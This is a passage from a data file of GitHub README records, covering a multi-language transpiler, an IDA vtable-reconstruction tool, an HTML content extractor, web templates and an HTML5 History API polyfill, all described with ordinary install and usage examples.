middleware\n    convert-tuples-to-classes middleware\n    convert-exception-based errors handling\n    to return-based error handling middleware\n              etc\n\n              ||\n              ||\n              ||\n              ||\n  TARGET LANGUAGE CODE GENERATOR\n\n      defined with a dsl aware\n      that handles formatting\n         automatically\n              ||\n              ||\n              ||\n              \\\/\n\n      Python \/ C# \/ Go \/ JS \/ Ruby\n```\n\n\n## use cases\n\n  * generate code for the same task\/algorithm in different languages (parser generators etc)\n  * port a library\/codebase\n  * develop core logic in one language and use it in other language codebases\n  * write a compiler\/dsl\n  * bootstrap a codebase in another language \/ generate equivalent test suites in different languages\n  * translate\/support some algorithms in different languages\n  * translate\/support some text\/data processing\/command tool in different languages\n\n## installation\n\n```bash\npip install pseudo #only python 3 supported\n\n# probably you'd like to try the python-to-pseudo-to-js\/go\/etc compiler\npip install pseudo-python\n```\n\n- [usage](#usage)\n- [why?](#why)\n- [language support](#language-support)\n- [compilers targetting pseudo](#compilers-targetting-pseudo)\n- [implementation](#implementation)\n- [roadmap](#roadmap)\n- [target language specific docs](#target-language-specific-docs)\n- [Pseudo and Haxe?](#pseudo-and-haxe)\n- [the name?](#the-name)\n\n\n## usage\n\nyou can directly generate pseudo ast from Python using Pseudo-Python\n```bash\npseudo-python a.py # generates a.pseudo.yaml\n```\nand then translate the ast\n```bash\npseudo a.pseudo.yaml go # or ruby \/ js \/ csharp \/ py \/ cpp\n```\nor you can directly translate from python to another language\n\n```bash\npseudo-python a.py b.rb # or c.cs\n```\n\n\n\n```python\npseudo.generate(pseudo_ast, language) # pseudo_ast is a plain dict or a pseudo Node-based tree\n```\n\n```python\npseudo.generate_from_yaml(pseudo_ast, language) # pseudo_ast is yaml-encoded pseudo ast\n```\n\nFor quick experiments it's easier to use `generate_main`\n\n```python\nfrom pseudo import * # ok for a repl\n\nprint(generate_main([\n  assignment(\n    local('a', 'Int'),\n    call(local('g'), [to_node(0), to_node('')], 'Int'))], 'rb'))\n\na = g(0, '')\n```\n\nIn the future Pseudo can add a lisp-like dsl for fast manual creation of ast nodes, but currently it's more useful for its main goal: consuming automatically generated pseudo ast and then transpiling it to the target languages.\n\n\n## why?\n\nSupporting full-blown Ruby to Python\/Javascript to C++ auto translation is hard.\n\nHowever often we need to just express an algorithm, a self-contained core of a library, a simple command line tool and the act of manual porting to another languages feels somehow .. primitive. \n\nOften that code is(or can be) expressed in very similar way, with\nsimilar constructs and basic types and data structures. On that level a lot of languages are very similar and the only real difference is syntax and methods api. That's a feasible task for automatic translation and actually the existance of `pseudo` is to fullfill the needs of several other existing projects\/ideas.\n\nAnother powerful thing about Pseudo is its standard library.\nIt can accumulate a serious number of methods\/idioms and it can act like e.g. a truly cross-platform, target-language-aware equivalent of lodash\n\nPseudo is still young (it's basically less than two weeks old), \nbut it already has a base on which it can improve really quickly\n(adding support for another language is basically just a matter of 3-4 hours currently)\n\n## Language support\n\nUsing pseudo's DSL it's easy to add support for a new language, so it's feasible to expect support for most popular languages and even different versions of them (e.g. EcmaScript 6\/7, Perl 5\/6 Java 7 \/ 8)\n\n## Compilers targetting pseudo\n\nCurrently [pseudo-python](https:\/\/github.com\/alehander42\/pseudo-python) is usable, and there are plans for `pseudo-ruby` or `pseudo-js`\n\n## Intermediate AST format\n\nThe AST format uses basic data structures available in most languages. The nodes correspond to \ndictionaries with `type` key corresponding to the node type and `field_name` keys corresponding to\nthe node fields, similar to the widely popular `estree` ecmascript format.\n\nPseudo can consume ast either serialized in `.pseudo.yaml` files or directly as\ndictionary objects through it's `pseudo.generate(ast, output_lang)` API\n\n## Implementation\n\n\n\nThe implementation goal is to make the definitions of new supported languages  really clear and simple. \n\nIf you dive in, you'll find out\na lot of the code\/api transformations are defined using a declarative dsl with rare ocassions \nof edge case handling helpers. \n\nThat has a lot of advantages:\n\n* Less bugs: the core transformation code is really generalized, it's reused as a dsl and its results are well tested\n\n* Easy to comprehend: it almost looks like a config file\n\n* Easy to add support for other languages: I was planning to support just python and c# in the initial version but it is so easy to add support for a language similar to the current supported ones, that I\nadded support for 4 more.\n\n* Easy to test: there is a simple test dsl too which helps all \nlanguage tests to share input examples [like that](tests\/test_ruby.py)\n\nHowever language translation is related to a lot of details and\na lot of little gotchas, tuning and refining some of them took days. Pseudo uses different abstractions to streamline the process and to reuse logic across languages.\n\n```ruby\nPSEUDO AST:\n   NORMAL CODE     PSEUDO STANDARD LIBRARY INVOCATIONS     \n      ||                    ||\n      ||                    ||\n      ||              API TRANSLATOR\n      ||                    ||\n      ||                    ||\n      ||                    \\\/\n      ||              IDIOMATIC TARGET LANGUAGE \n      ||              STANDARD LIBRARY INVOCATIONS        \n      ||                    ||     \n      \\\/                    \\\/\n  STANDARD OR LANGUAGE-SPECIFIC MIDDLEWARES\n              e.g.\n    name camel_case\/snake_case middleware\n    convert-tuples-to-classes middleware\n    convert-exception-based errors handling\n    to return-based error handling middleware\n              etc\n\n              ||\n              ||\n              ||\n              ||\n  TARGET LANGUAGE CODE GENERATOR\n\n      defined with a dsl aware\n      that handles formatting\n         automatically\n              ||\n              ||\n              ||\n              \\\/\n\n            OUTPUT\n```\n\n\n\n## Roadmap\n\nPseudo has undergone some changes through the last year in my local repo, the new release somewhere in the next months should contain some of this roadmap.\n\n[Roadmap](roadmap.md)\n\n## Target language specific docs\n\n* [python](docs\/python.md)\n* [c#](docs\/csharp.md)\n* [go](docs\/go.md)\n* [ruby](docs\/ruby.md)\n* [javascript](docs\/javascript.md)\n* [c++](docs\/cpp.md)\n\n## Pseudo and Haxe\n\nThey might seem comparable at a first glance, but they have completely different goals.\n\nPseudo wants to generate readable code, ideally something that looks like a human wrote it\/ported it\n\nPseudo doesn't use a target language runtime, it uses the target language standard library for everything (except for JS, but even there is uses `lodash` which is pretty popular and standard)\n\nPseudo's goal is to help with automated translation for cases\nlike algorithm generation, parser generation, refactoring, porting codebases etc. The fact that you can write compilers targetting Pseudo and receiver translation to many languages for free is just a happy accident\n\n## The name?\n\nwell.\n\npseudo(code)\n\n\n## License\n\nCopyright \u00a9 2015 2016 [Alexander Ivanov](https:\/\/twitter.com\/alehander42)\n\nDistributed under the MIT License.\n"},{"repo":"\/0xgalz\/Virtuailor","language":"Python","readme_contents":"# Virtuailor - IDAPython tool for C++ vtables reconstruction \n\n\nVirtuailor is an IDAPython tool that reconstructs vtables for C++ code written for intel architecture, both 32bit and 64bit code and AArch64 (New!).\nThe tool constructed from 2 parts, static and dynamic.\n\nThe first is the static part, contains the following capabilities:\n* Detects indirect calls.\n* Hooks the value assignment of the indirect calls using conditional breakpoints (the hook code). \n\nThe second is the dynamic part, contains the following capabilities:\n* Creates vtable structures. \n* Rename functions and vtables addresses.\n* Add structure offset to the assembly indirect calls. \n* Add xref from indirect calls to their virtual functions(multiple xrefs).\n* For AArch64- tries to fix undefined vtables and related virtual functions (support for firmware).\n\n## How to Use?\n\n1. By default Virtuailor will look for virtual calls in ALL the addresses in the code.\nIf you want to limit the code only for specific address range, no problem, just edit the *Main* file to add the range you want to target in the variables start_addr_range and end_addr_range:\n\n```python\nif __name__ == '__main__':\n\n    start_addr_range = idc.MinEA()  # You can change the virtual calls address range\n    end_addr_range = idc.MaxEA()\n    add_bp_to_virtual_calls(start_addr_range, end_addr_range)\n```\n\n2. Optional, (but extremely recommended), create a snapshot of your idb. Just press ctrl+shift+t and create a snapshot.\n\n3. Press File->Run script... then go to Virtuailor folder and choose to run Main.py, You can see the following gif for a more clear and visual explanation.\n![How to use](https:\/\/github.com\/0xgalz\/Virtuailor\/blob\/master\/Images\/howto.gif)\n\nNow the GUI will provide you an option to choose a range to target, in case you would like to target all the binary just press OK with the default values in the start and end addresses. \n\nAfterwards the breakpoints will be placed in your code and all you have to do is to execute your code with IDA debugger, do whatever actions you want and see how the vtables is being built! \nFor AArch64 you can setup a remote gdb server and debug using the IDA debuggger.\n\nIn case you don't want\/need the breakpoints anymore just go to the breakpoint list tab in IDA and delete the breakpoints as you like.\n\nIt is also really important for me to note that this is the second version of the tool with both 32 and 64 bit support and aarch64, probably in some cases a small amount of breakpoints will be missed, in these cases please open an issue and contact me so I will be able to improve the code and help fixing it. Thank you in advanced for that :)\n\n## Output and General Functions\n\n#### vtables structures\nThe structures Virtuailor creates from the vtable used in virtual call that were hit. The vtable functions are extracted from the memory based on the relevant register that was used in the BP opcode.\n\n![vtable example](https:\/\/github.com\/0xgalz\/Virtuailor\/blob\/master\/Images\/vtable_structure.png)\nSince I wanted to create a correlation between the structure in IDA and the vtables in the data section, the BP changes the vtable address name in the data section to the name of the structure. As you can see in the following picture:\n![vtable example](https:\/\/github.com\/0xgalz\/Virtuailor\/blob\/master\/Images\/vtable_in_memory.png)\n\nThe virtual functions names are also being changed, take aside situations where the names are not the default IDA names (functions with symbols or functions that the user changed) in those cases the function names will stay the same and will also be add to the vtable structure with their current name.\n\nThe chosen names is constructed using the following pattern: \n* vtable_ \n* vfunc_\nthe rest of the name is either offset from the beginning of the Segment, this is mostly because most binaries nowadays are PIE and PIC and thus ASLR is enforced, (instead of using the full address name, which is also quite long on 64bit environments).\nThe vtable structure also has a comment, \"Was called from offset: XXXX\", this offset is the offset from the beginning of the Segment.\n\n#### Adding Structures to the Assembly\n\nAfter creating the vtable Virtuailor also adds a connection between the structure created and the assembly as you can see in the following images:\n![BP after an execution, Example 2](https:\/\/github.com\/0xgalz\/Virtuailor\/blob\/master\/Images\/stroff2.png)\n\nP.S: The structure offset used in the BP is only relevant for the last call that was made, in order to get a better understanding of all the virtual calls that were made the xref feature was added as explained in the next section\n\n#### Xref to virtual functions\n\nWhen reversing C++ statically it is not trivial to see who called who, this is because most calls are indirect calls, however after running Virtuailor every function that was called indirectly now has an xref to those locations.\n\nThe following gif shows the added Xrefs with their indirect function call:\n\n![xref](https:\/\/github.com\/0xgalz\/Virtuailor\/blob\/master\/Images\/xref.gif)\n\n## Former talks and lectures \n\nThe tool was presented in RECon brussels, Troopers and Warcon. \nThe presentation could be found in the following link: https:\/\/www.youtube.com\/watch?v=Xk75TM7NmtA\n\n## Thanks\n\nREcon Brussels, Troopers, Warcon crews, Nana, @tmr232, @matalaz, @oryandp, @talkain, @shiftreduce\n\n\n## License\n\nThe plugin is licensed under the GNU GPL v3 license.\n"},{"repo":"\/srijiths\/readabilityBUNDLE","language":"Java","readme_contents":"readabilityBUNDLE\n=================\n\nMain Content Extraction from html written in Java. It will extract the article text with out the around clutters.\n\nRecent days its really a challenging open issue to extract the main article content from html pages. There are many open source algorithms \/ implementations available. What i aim in this project is concise some of the best content extraction algorithm implemented in JAVA.\n\nMy focus is mainly on the tuning parameters and customization \/ modifications of these algorithmic features according to my requirements.\n\nreadabilityBUNDLE will perform equally what other algorithms does plus below listed extras. \n\nWhats extra in readabilityBUNDLE\n================================\n\n* Preserve the html tags in the extracted content.\n* Keep all the possible images in the content instead of finding best image.\n* Keep all the available videos.\n* Better extraction of li,ul,ol tags\n* Content normalization of extracted content.\n* Incorporated 3 best popular extraction algorithm , you can choose based on your requirement.\n* Provision to append next pages extracted content and create a consolidated output\n* Many cleaner \/ formatter measures added.\n* Some core changes in algorithms.\n\nThe main challenge which i was facing to extract the main content by keeping all the images \/ videos \/ html tags \/ and some realated div tags which are used as content \/ non content identification by most of the algorithms.\n\nreadabilityBUNDLE borrows much code and concepts from [Project Goose](https:\/\/github.com\/GravityLabs\/goose) , [Snacktory](https:\/\/github.com\/karussell\/snacktory) and [Java-Readability](https:\/\/github.com\/basis-technology-corp\/Java-readability). My intension was just fine tune \/ modify the algorithm to work with my requirements.\n\nSome html pages works very well in a particular algorithm and some not. This is the main reason i put all the available algorithm under a roof . You can choose an algorithm which best suits you.\n\nYou can see all author citations in each java file itself.\n\nDependency Projects\n===================\n* [StringHelpers](https:\/\/github.com\/srijiths\/StringHelpers)\n* [Network](https:\/\/github.com\/srijiths\/Network)\n* [NextPageFinder] (https:\/\/github.com\/srijiths\/NextPageFinder)\n\nUsage\n=====\nYou need to say which extraction algorithm to use. The 3 extraction algorithms are ReadabilitySnack,ReadabilityCore and ReadabilityGoose. By default its ReadabilitySnack.\n\n* With out next page finding\n\nSample Usage\n\n\tArticle article = new Article();\n\tContentExtractor ce = new ContentExtractor();\n\tHtmlFetcher htmlFetcher = new HtmlFetcher();\n\tString html = htmlFetcher.getHtml(\"http:\/\/blogmaverick.com\/2012\/11\/19\/what-i-really-think-about-facebook\/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+Counterparties+%28Counterparties%29\", 0);\n\n\tarticle = ce.extractContent(html, \"ReadabilitySnack\");\n\n\tSystem.out.println(\"Content : \"+article.getCleanedArticleText());\n\n* With next page html sources\n\nIf you need to extract and append content from next pages also then,\n\n* You can use [NextPageFinder] (https:\/\/github.com\/srijiths\/NextPageFinder) to find out all the next pages links.\n* Get the html of each next pages as a List of String using [Network](https:\/\/github.com\/srijiths\/Network)\n* Pass it to the content extractor like\n\n\tarticle = ce.extractContent(firstPageHtml,extractionAlgorithm,nextPagesHtmlSources)\n\nBuild\n=====\n\nUsing Maven , mvn clean package\n\nLicense\n=======\nApache License 2 - http:\/\/www.apache.org\/licenses\/LICENSE-2.0.html"},{"repo":"\/piluke\/GameMaker-HTML5-Player","language":"Java","readme_contents":"Make sure to read LICENSE before using the source code in any way.\n\nDo whatever you want with the code, but if you find something beneficial, we'd love to hear from you.\n\nIf you find any bugs, feel free to report them, but make sure they haven't already been submitted.\n\nThe Converter works, but only for small portions of code. We've just released it, so please be patient as we continue to make it better.\n\nThe Converter contains reading and parsing codes from LGM by IsmAvatar <IsmAvatar@gmail.com>, Clam <clamisgood@gmail.com>, and Quadduc <quadduc@gmail.com>.\n"},{"repo":"\/themefisher\/Blue-Onepage-HTML5-Business-Template","language":"CSS","readme_contents":"# Blue - OnePage Bootstrap Business Template\n\nLooking best place to download Free Onepage Responsive Corporate Template built with HTML5 and CSS3? Themefisher is the destination providing the most efficient, free approach to design or redesign a corporate website. To serve any kind of business needs Blue, the Twitter Bootstrap 3 based Free HTML5\/CSS3 responsive template pops out. The template is lightweight, comes with booster speed to load websites fast even in the poor bandwidth. Blue is most downloaded and Bootstrap framework enabled one page HTML theme, best-suited sites like startups, business, agency, corporate agency, corporate, portfolio, showcasing, photography studio, SME business, non-profit organizations, fashion government agencies, personal service, web development firm, web designing firm, and many more.\n\n<img src=\"https:\/\/cloud.githubusercontent.com\/assets\/10640964\/5987921\/7650444a-a970-11e4-91e4-6f53baebca99.jpg\" alt=\"Free bootstrap business template by themefisher\">\n\n**NOTE:** Please remember to **STAR** this project and **FOLLOW** [my Github](https:\/\/github.com\/themefisher) to keep you update with this template.\n\n## Demo & Download \n\nA fully functional demo is available at <a href=\"http:\/\/demo.themefisher.com\/demos\/?theme=blue\">Demo<\/a>\nYou can visit our website to download this theme <a href=\"https:\/\/themefisher.com\/products\/blue-free-onepage-responsive-corporate-template\/\">Download Now<\/a>\n \n\n\n## Bugs Reports\n\nHave a bug or a feature request? Please open a new issue.\n\n## Copyright and license\n\nCopyright 2017 themefisher.com, <a target=\"_blank\" href=\"https:\/\/themefisher.com\/license\">License<\/a>\n\n## Support Themefisher Development\nThis template is a MIT licensed open source project and completely free to use. However, the amount of effort needed to maintain and develop new features for the project is not sustainable without proper financial backing. You can support development by buying one of our [premium templates](https:\/\/themefisher.com\/premium-templates\/).\n\n\n### Check out our FREE Bootstrap & HTML5 Templates\nGet More FREE Bootstrap templates from our store <a href=\"https:\/\/themefisher.com\/free-bootstrap-templates\">Bootstrap Templates Store<\/a>\nAnd if you want FREE HTML5 Templates then please visit our listing content <a href=\"https:\/\/themefisher.com\/best-free-html5-templates-2016\/\">HTML5 Templates<\/a>\nVisit Our Website For More Amazing Works\n<a href=\"https:\/\/themefisher.com\">Website<\/a>\n\n"},{"repo":"\/SonarSource\/sonar-html","language":"Java","readme_contents":"SonarQube HTML Plugin\r\n====================\r\n\r\n[![Build Status](https:\/\/api.travis-ci.org\/SonarSource\/sonar-html.svg)](https:\/\/travis-ci.org\/SonarSource\/sonar-html)\r\n\r\nProject homepage:\r\nhttp:\/\/redirect.sonarsource.com\/plugins\/web.html\r\n\r\nIssue tracking:\r\nhttp:\/\/jira.sonarsource.com\/browse\/SONARHTML\r\n\r\n### License\r\n\r\nCopyright 2010-2018 SonarSource.\r\n\r\nLicensed under the [GNU Lesser General Public License, Version 3.0](http:\/\/www.gnu.org\/licenses\/lgpl.txt)\r\n"},{"repo":"\/devote\/HTML5-History-API","language":"JavaScript","readme_contents":"ENGLISH\n=============================================================================================================\n\nThis Javascript library provides an emulation of HTML5 History API for older browsers.\n\nThe library operates according to W3C specification, adding no new or incompatible methods. The library can be used exactly as described, for example, in Dive Into HTML5 book (http:\/\/diveintohtml5.info\/history.html) or in the History API Specification (http:\/\/www.w3.org\/TR\/html5\/browsers.html#the-history-interface).\n\n### You may install this plugin with this command:\n```shell\nnpm install html5-history-api\n```\n\n### Browser Support:\n\n`history.js` - IE8+ and other browsers\n\n`history.ielte7.js` - IE6+ and other browsers\n\n### For library developers:\n\nTo enable support for HTML5-History-API polyfill in your library, you need to add one line of code: \n```js\nvar location = window.history.location || window.location;\n```\n\ncode of library looks like this:\n```js\n(function(){\n  \/\/ To enable support for HTML5-History-API polyfill in your library\n  var location = window.history.location || window.location;\n\n  \/\/ you library code here\n  \/\/ ....\n  \/\/ ....\n  \/\/ ....\n})();\n```\n\n### AMD Support:\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <script type=\"text\/javascript\" src=\"\/require.js\"><\/script>\n    <script type=\"text\/javascript\">\n      requirejs(['\/history'], function() {\n        if (history.emulate) {\n          console.log('In your browser is emulated HTML5-History-API');\n        } else {\n          console.log('In your browser is natively support HTML5-History-API');\n        }\n      });\n    <\/script>\n  <\/head>\n  <body>\n  <\/body>\n<\/html>\n```\n\n### Example of using the library in the pure JS context:\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <script type=\"text\/javascript\" src=\"history.js\"><\/script>\n    <script type=\"text\/javascript\">\n      (function(eventInfo) {\n        \/\/ we get a normal Location object\n\n        \/*\n         * Note, this is the only difference when using this library,\n         * because the object window.location cannot be overriden,\n         * so library the returns generated \"location\" object within\n         * an object window.history, so get it out of \"history.location\".\n         * For browsers supporting \"history.pushState\" get generated\n         * object \"location\" with the usual \"window.location\".\n         *\/\n        var location = window.history.location || window.location;\n\n        \/\/ hang on the event, all references in this document\n        document[eventInfo[0]](eventInfo[1] + 'click', function(event) {\n          event = event || window.event;\n          var target = event.target || event.srcElement;\n          \/\/ looking for all the links with 'ajax' class found\n          if (target && target.nodeName === 'A' &&\n             (' ' + target.className + ' ').indexOf(' ajax ') >= 0)\n          {\n            \/\/ keep the link in the browser history\n            history.pushState(null, null, target.href);\n\n            \/\/ here can cause data loading, etc.\n\n            \/\/ do not give a default action\n            if (event.preventDefault) {\n              event.preventDefault();\n            } else {\n              event.returnValue = false;\n            }\n          }\n        }, false);\n\n        \/\/ hang on popstate event triggered by pressing back\/forward in browser\n        window[eventInfo[0]](eventInfo[1] + 'popstate', function(event) {\n\n          \/\/ here can cause data loading, etc.\n\n          \/\/ just post\n          alert(\"We returned to the page with a link: \" + location.href);\n        }, false);\n      })(window.addEventListener ? ['addEventListener', ''] : ['attachEvent', 'on']);\n    <\/script>\n  <\/head>\n  <body>\n    <a class=\"ajax\" href=\"\/mylink.html\">My Link<\/a>\n    <a class=\"ajax\" href=\"\/otherlink.html\">Other Link<\/a>\n  <\/body>\n<\/html>\n```\n\n### Example of using the library along with JQuery:\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <script type=\"text\/javascript\" src=\"history.js\"><\/script>\n    <script type=\"text\/javascript\" src=\"jquery.js\"><\/script>\n    <script type=\"text\/javascript\">\n      $(function() {\n        \/\/ we get a normal Location object\n\n        \/*\n         * Note, this is the only difference when using this library,\n         * because the object window.location cannot be overriden,\n         * so library the returns generated \"location\" object within\n         * an object window.history, so get it out of \"history.location\".\n         * For browsers supporting \"history.pushState\" get generated\n         * object \"location\" with the usual \"window.location\".\n         *\/\n        var location = window.history.location || window.location;\n\n        \/\/ looking for all the links and hang on the event, all references in this document\n        $(document).on('click', 'a.ajax', function() {\n          \/\/ keep the link in the browser history\n          history.pushState(null, null, this.href);\n\n          \/\/ here can cause data loading, etc.\n\n          \/\/ do not give a default action\n          return false;\n        });\n\n        \/\/ hang on popstate event triggered by pressing back\/forward in browser\n        $(window).on('popstate', function(e) {\n\n          \/\/ here can cause data loading, etc.\n\n          \/\/ just post\n          alert(\"We returned to the page with a link: \" + location.href);\n        });\n      });\n    <\/script>\n  <\/head>\n  <body>\n    <a class=\"ajax\" href=\"\/mylink.html\">My Link<\/a>\n    <a class=\"ajax\" href=\"\/otherlink.html\">Other Link<\/a>\n  <\/body>\n<\/html>\n```\n\n### Advanced library configuration:\n\n    history.js?basepath=\/pathtosite\/ - the base path to the site; defaults to the root \"\/\".\n    history.js?redirect=true - enable link translation.\n    history.js?type=\/ - substitute the string after the anchor; by default \"\/\".\n\nYou can also combine options:\n\n    history.js?type=\/&redirect=true&basepath=\/pathtosite\/ - the order of options does not matter.\n\nOr execute special method in JavaScript:\n```js\nhistory.redirect(\/* type = *\/ '\/', \/* basepath = *\/ '\/pathtosite\/');\n```\nDemo Site: http:\/\/history.spb-piksel.ru\/ or http:\/\/devote.github.io\/demos\/history\/\n\nFollow me on Twitter: https:\/\/twitter.com\/DimaPakhtinov\n\n-------------------------------------------------------------------------------------------------------------\n\n\u0420\u0423\u0421\u0421\u041a\u0418\u0419\n=============================================================================================================\n\n\u0411\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 \u044d\u043c\u0443\u043b\u0438\u0440\u0443\u0435\u0442 HTML5 History API \u0432 \u0441\u0442\u0430\u0440\u044b\u0445 \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u0430\u0445.\n\n\u0411\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043d\u0435 \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u0442 \u043d\u0435\u043d\u0443\u0436\u043d\u044b\u0435 \u043c\u0435\u0442\u043e\u0434\u044b, \u0437\u0430\u0441\u0442\u0430\u0432\u043b\u044f\u044f \u0438\u0445 \u0438\u0437\u0443\u0447\u0430\u0442\u044c, \u0430 \u043e\u043f\u0435\u0440\u0438\u0440\u0443\u0435\u0442 \u043f\u043e \u0441\u043f\u0435\u0446\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0438 w3c, \u043f\u043e \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0443 History.\n\n\u0414\u043b\u044f \u043f\u0440\u0438\u043c\u0435\u0440\u0430 \u043c\u043e\u0433\u0443 \u043f\u0440\u0438\u0432\u0435\u0441\u0442\u0438 \u043a\u043e\u0440\u043e\u0442\u043a\u0438\u0439 \u043a\u043e\u0434 \u043a\u0430\u043a \u0441 \u043d\u0435\u0439 \u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c.\n\n\u041f\u043e \u043f\u0440\u0438\u043d\u0446\u0438\u043f\u0443 \u043c\u044b \u0440\u0430\u0431\u043e\u0442\u0430\u0435\u043c \u0441 HTML5 History API \u0442\u0430\u043a \u043a\u0430\u043a \u043e\u043f\u0438\u0441\u0430\u043d\u043e, \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, \u0442\u0443\u0442 http:\/\/htmlbook.ru\/html5\/history \u0438\u043b\u0438 \u043f\u043e \u0441\u043f\u0435\u0446\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0438 http:\/\/www.w3.org\/TR\/html5\/history.html#the-history-interface\n\n### \u0412\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u043f\u043b\u0430\u0433\u0438\u043d \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043a\u043e\u043c\u0430\u043d\u0434\u044b:\n```shell\nnpm install html5-history-api\n```\n\n### \u041f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0430 \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u043e\u0432:\n\n`history.js` - IE8+ \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u044b\n\n`history.ielte7.js` - IE6+ \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u044b\n\n### \u0414\u043b\u044f \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a\u043e\u0432 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a:\n\n\u0414\u043b\u044f \u0432\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0438 \u043f\u043b\u0430\u0433\u0438\u043d\u0430 HTML5-History-API polyfill \u0432 \u0441\u0432\u043e\u0438\u0445 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430\u0445, \u0434\u043e\u0431\u0430\u0432\u044c\u0442\u0435 \u0441\u0442\u0440\u043e\u043a\u0443 \u043a\u043e\u0434\u0430:\n```js\nvar location = window.history.location || window.location;\n```\n\n\u043a\u043e\u0434 \u0431\u0443\u0434\u0435\u0442 \u0432\u044b\u0433\u043b\u044f\u0434\u0435\u0442\u044c \u043f\u0440\u0438\u043c\u0435\u0440\u043d\u043e \u0442\u0430\u043a:\n```js\n(function(){\n  \/\/ \u0412\u043a\u043b\u044e\u0447\u0430\u0435\u0442 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0443 \u043f\u043b\u0430\u0433\u0438\u043d\u0430 HTML5-History-API polyfill\n  var location = window.history.location || window.location;\n\n  \/\/ \u043a\u043e\u0434 \u0432\u0430\u0448\u0435\u0439 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0438\n  \/\/ ....\n  \/\/ ....\n  \/\/ ....\n})();\n```\n\n### \u041f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0430 AMD:\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <script type=\"text\/javascript\" src=\"\/require.js\"><\/script>\n    <script type=\"text\/javascript\">\n      requirejs(['\/history'], function() {\n        if (history.emulate) {\n          console.log('\u0412 \u0432\u0430\u0448\u0435\u043c \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u0435 \u044d\u043c\u0443\u043b\u0438\u0440\u0443\u0435\u0442\u0441\u044f HTML5-History-API');\n        } else {\n          console.log('\u0412 \u0432\u0430\u0448\u0435\u043c \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u0435 \u0435\u0441\u0442\u044c \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0430 HTML5-History-API');\n        }\n      });\n    <\/script>\n  <\/head>\n  <body>\n  <\/body>\n<\/html>\n```\n\n### \u041a\u043e\u0440\u043e\u0442\u0435\u043d\u044c\u043a\u0438\u0439 \u043f\u0440\u0438\u043c\u0435\u0440 \u043d\u0430 \u0447\u0438\u0441\u0442\u043e\u043c JS:\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <script type=\"text\/javascript\" src=\"history.js\"><\/script>\n    <script type=\"text\/javascript\">\n      (function(eventInfo) {\n        \/\/ \u043f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u043d\u043e\u0440\u043c\u0430\u043b\u044c\u043d\u044b\u0439 \u043e\u0431\u044a\u0435\u043a\u0442 Location\n\n        \/*\n         * \u0437\u0430\u043c\u0435\u0442\u044c\u0442\u0435, \u044d\u0442\u043e \u0435\u0434\u0438\u043d\u0441\u0442\u0432\u0435\u043d\u043d\u0430\u044f \u0440\u0430\u0437\u043d\u0438\u0446\u0430 \u043f\u0440\u0438 \u0440\u0430\u0431\u043e\u0442\u0435 \u0441 \u0434\u0430\u043d\u043d\u043e\u0439 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u043e\u0439,\n         * \u0442\u0430\u043a \u043a\u0430\u043a \u043e\u0431\u044a\u0435\u043a\u0442 window.location \u043d\u0435\u043b\u044c\u0437\u044f \u043f\u0435\u0440\u0435\u0437\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c, \u043f\u043e\u044d\u0442\u043e\u043c\u0443\n         * \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 history \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0441\u0444\u043e\u0440\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \"location\" \u043e\u0431\u044a\u0435\u043a\u0442 \u0432\u043d\u0443\u0442\u0440\u0438\n         * \u043e\u0431\u044a\u0435\u043a\u0442\u0430 window.history, \u043f\u043e\u044d\u0442\u043e\u043c\u0443 \u043f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0435\u0433\u043e \u0438\u0437 \"history.location\".\n         * \u0414\u043b\u044f \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u043e\u0432 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u044e\u0449\u0438\u0445 \"history.pushState\" \u043f\u043e\u043b\u0443\u0447\u0430\u0435\u043c\n         * \u0441\u0444\u043e\u0440\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u043e\u0431\u044a\u0435\u043a\u0442 \"location\" \u0441 \u043e\u0431\u044b\u0447\u043d\u043e\u0433\u043e \"window.location\".\n         *\/\n        var location = window.history.location || window.location;\n\n        \/\/ \u0432\u0435\u0448\u0430\u0435\u043c 